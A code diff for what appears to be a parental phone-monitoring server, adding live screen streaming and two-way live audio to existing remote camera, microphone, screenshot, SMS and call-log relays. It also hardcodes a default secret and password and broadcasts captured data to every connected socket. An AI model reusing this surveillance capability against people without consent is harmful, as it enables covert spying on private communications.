@@ -16,10 +16,9 @@ app.use(express.json());
 
 const JWT_SECRET = process.env.JWT_SECRET || 'change-this-secret-in-production';
 const parentAccounts = [{ email: 'parent@example.com', password: 'changeme123' }];
-const connectedDevices = {}; // deviceId -> { socketId, info, battery }
-const deviceNames = {};      // deviceId -> custom display name
+const connectedDevices = {};
+const deviceNames = {};
 
-// ── Screenshot folder helper ──────────────────────────────────────
 function getScreenshotFolder(deviceId) {
   const folder = path.join(os.homedir(), 'Desktop', 'MDM-Screenshots', deviceId);
   fs.mkdirSync(folder, { recursive: true });
@@ -42,8 +41,7 @@ app.post('/api/login', (req, res) => {
   const { email, password } = req.body;
   const account = parentAccounts.find(a => a.email === email && a.password === password);
   if (!account) return res.status(401).json({ error: 'Invalid credentials' });
-  const token = jwt.sign({ email }, JWT_SECRET, { expiresIn: '7d' });
-  res.json({ token });
+  res.json({ token: jwt.sign({ email }, JWT_SECRET, { expiresIn: '7d' }) });
 });
 
 app.get('/api/devices', authenticate, (req, res) => {
@@ -83,8 +81,20 @@ io.on('connection', socket => {
       console.log(`Child disconnected: ${deviceId}`);
     });
 
-    socket.on('camera:frame', data => io.emit('camera:frame', { deviceId, ...data }));
-
+    socket.on('camera:frame',    data => io.emit('camera:frame',    { deviceId, ...data }));
+    socket.on('screen:frame',    data => io.emit('screen:frame',    { deviceId, ...data }));
+    socket.on('mic:audio',       data => io.emit('mic:audio',       { deviceId, ...data }));
+    socket.on('mic:state',       data => io.emit('mic:state',       { deviceId, ...data }));
+    socket.on('call:logs',       data => io.emit('call:logs',       { deviceId, ...data }));
+    socket.on('sms:messages',    data => io.emit('sms:messages',    { deviceId, ...data }));
+    socket.on('battery:update',  data => {
+      if (connectedDevices[deviceId]) connectedDevices[deviceId].battery = data;
+      io.emit('battery:update', { deviceId, ...data });
+    });
+    socket.on('device:info', data => {
+      if (connectedDevices[deviceId]) connectedDevices[deviceId].info = data;
+      io.emit('device:info', { deviceId, ...data });
+    });
     socket.on('screenshot:data', ({ frame }) => {
       try {
         const folder = getScreenshotFolder(deviceId);
@@ -92,37 +102,16 @@ io.on('connection', socket => {
         const filename = `${ts}.jpg`;
         const filepath = path.join(folder, filename);
         fs.writeFileSync(filepath, Buffer.from(frame, 'base64'));
-        console.log(`Screenshot saved: ${filepath}`);
         io.emit('screenshot:saved', { deviceId, filename, filepath, timestamp: Date.now() });
-      } catch (err) {
-        console.error('Screenshot save error:', err.message);
-      }
+      } catch (err) { console.error('Screenshot error:', err.message); }
     });
-
-    socket.on('mic:audio', data => io.emit('mic:audio', { deviceId, ...data }));
-    socket.on('mic:state', data => io.emit('mic:state', { deviceId, ...data }));
-
-    socket.on('device:info', data => {
-      if (connectedDevices[deviceId]) connectedDevices[deviceId].info = data;
-      io.emit('device:info', { deviceId, ...data });
-    });
-
-    socket.on('battery:update', data => {
-      if (connectedDevices[deviceId]) connectedDevices[deviceId].battery = data;
-      io.emit('battery:update', { deviceId, ...data });
-    });
-
-    socket.on('call:logs',    data => io.emit('call:logs',    { deviceId, ...data }));
-    socket.on('sms:messages', data => io.emit('sms:messages', { deviceId, ...data }));
   }
 
   // ── Parent dashboard ─────────────────────────────────────────
   if (role === 'parent') {
     console.log('Parent connected');
 
-    function toChild(devId) {
-      return connectedDevices[devId]?.socketId || null;
-    }
+    function toChild(devId) { return connectedDevices[devId]?.socketId || null; }
 
     function relay(cmd) {
       socket.on(cmd, ({ deviceId: devId, ...rest }) => {
@@ -131,21 +120,24 @@ io.on('connection', socket => {
       });
     }
 
-    relay('cmd:camera:start');
-    relay('cmd:camera:stop');
-    relay('cmd:camera:start:front');
-    relay('cmd:camera:start:back');
-    relay('cmd:camera:stop:front');
-    relay('cmd:camera:stop:back');
-    relay('cmd:mic:on');
-    relay('cmd:mic:off');
+    relay('cmd:camera:start'); relay('cmd:camera:stop');
+    relay('cmd:camera:start:front'); relay('cmd:camera:stop:front');
+    relay('cmd:camera:start:back');  relay('cmd:camera:stop:back');
+    relay('cmd:mic:on'); relay('cmd:mic:off');
     relay('cmd:screenshot');
-    relay('cmd:get:calllogs');
-    relay('cmd:get:sms');
+    relay('cmd:get:calllogs'); relay('cmd:get:sms');
+    relay('cmd:screen:start'); relay('cmd:screen:stop');
+    relay('cmd:speak:live:start'); relay('cmd:speak:live:stop');
 
     socket.on('cmd:speak', ({ deviceId: devId, audioData }) => {
       const s = toChild(devId);
       if (s) io.to(s).emit('cmd:speak', { audioData });
+    });
+
+    // Live speak chunks — relay directly to child
+    socket.on('speak:live:chunk', ({ deviceId: devId, chunk }) => {
+      const s = toChild(devId);
+      if (s) io.to(s).emit('speak:live:chunk', { chunk });
     });
   }
 });
